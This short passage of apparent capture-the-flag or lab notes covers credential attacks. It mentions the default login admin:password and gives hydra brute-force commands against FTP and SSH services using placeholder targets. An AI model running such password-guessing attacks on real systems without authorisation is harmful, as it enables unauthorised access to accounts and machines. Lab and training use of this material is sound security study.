Web frameworks often use `admin:password` as the default login credentials, **have you tried this?**.

### 1. **FTP**

`hydra -l {username} -P {password list} ftp://MACHINE_IP`

### 2. **SSH**

`hydra -l <username> -P <full path to password list> MACHINE_IP -t 4 ssh`

The option `t` sets the number of threads to spawn.




